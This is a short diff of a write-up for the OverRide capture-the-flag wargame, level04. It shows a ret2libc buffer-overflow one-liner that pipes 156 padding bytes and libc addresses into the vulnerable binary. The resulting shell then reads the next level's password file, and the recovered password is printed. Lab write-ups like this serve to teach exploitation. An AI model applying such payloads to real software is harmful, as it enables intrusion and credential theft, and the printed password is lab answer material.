@@ -87,6 +87,6 @@ warning: Unable to access target memory at 0xf7fd3b74, halting search.
 
 ```bash
 level04@OverRide:$ (python -c 'print ("A" * 156) + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]';cat) | ./level04
-cat /home/users/level05/.pass
+% cat /home/users/level05/.pass
 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 ```
